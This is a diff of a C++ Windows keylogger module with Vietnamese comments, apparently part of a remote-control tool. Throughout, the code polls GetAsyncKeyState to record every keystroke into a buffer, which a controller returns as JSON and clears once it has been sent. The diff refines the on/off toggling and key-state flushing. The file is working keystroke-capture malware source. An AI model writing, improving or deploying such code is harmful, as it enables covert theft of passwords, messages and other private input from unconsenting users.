@@ -5,7 +5,7 @@
 #include <mutex>
 #include <atomic>
 #include <thread>
-#include <sstream>
+#include <iostream>
 
 using namespace std;
 
@@ -19,20 +19,30 @@ static atomic<bool> keylogEnabled(false);
  */
 static void KeyLogger()
 {
+    cout << "[SYSTEM] KeyLogger Thread da khoi dong." << endl;
     while (true)
     {
-        if (!keylogEnabled.load())
-        {
-            Sleep(200);
-            continue;
-        }
-        Sleep(10);
+        Sleep(10); 
+        
+        // Lay trang thai hien tai TRUOC KHI quet phim
+        bool isEnabled = keylogEnabled.load();
+
         for (int i = 1; i < 256; i++)
         {
-            if (GetAsyncKeyState(i) == -32767)
+            // Doc va XOA trang thai phim NGAY LAP TUC
+            short keyState = GetAsyncKeyState(i);
+
+            // NEU dang TAT keylogger thi KHONG XU LY GI CA, chi doc de xoa trang thai
+            if (!isEnabled) {
+                continue;  // Bo qua, chi doc de xoa trang thai
+            }
+
+            // Chi xu ly khi dang BAT va phim duoc nhan
+            if (keyState == -32767)
             {
                 lock_guard<mutex> lock(logMutex);
                 bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) || (GetKeyState(VK_CAPITAL) & 0x0001);
+                
                 if (i >= 65 && i <= 90)
                     keylogBuffer += shift ? (char)i : (char)(i + 32);
                 else if (i >= 48 && i <= 57)
@@ -50,7 +60,6 @@ static void KeyLogger()
                     keylogBuffer += "[TAB]";
                 else if (i == VK_OEM_PERIOD)
                     keylogBuffer += shift ? ">" : ".";
-                // (Co the them cac phim OEM khac neu can)
             }
         }
     }
@@ -67,13 +76,34 @@ string KeylogController::getKeylog()
 {
     lock_guard<mutex> lock(logMutex);
     string safeLog = jsonEscape(keylogBuffer);
-    // --- SUA LOI: Khong them 'command' hay 'payload' ---
+    
+    // Tra ve JSON status
     string json = "{\"log\":\"" + safeLog + "\", \"enabled\":" + (keylogEnabled.load() ? "true" : "false") + "}";
+    
+    // Xoa buffer sau khi da gui di
     keylogBuffer = "";
     return json;
 }
 
 void KeylogController::setKeylog(bool enabled)
 {
+    cout << "[CMD] Doi trang thai Keylog: " << (enabled ? "BAT" : "TAT") << endl;
+
+    // Khi tat, xoa buffer va FLUSH tat ca trang thai phim
+    if (!enabled) {
+        lock_guard<mutex> lock(logMutex);
+        keylogBuffer = "";
+        
+        // XOA HET TRANG THAI PHIM
+        cout << "[CMD] Dang xoa trang thai tat ca phim..." << endl;
+        for (int i = 0; i < 3; i++) {  // Lap 3 lan de chac chan
+            for (int key = 1; key < 256; key++) {
+                GetAsyncKeyState(key);
+            }
+            Sleep(10);
+        }
+        cout << "[CMD] Da xoa xong trang thai phim." << endl;
+    }
+    
     keylogEnabled.store(enabled);
 }
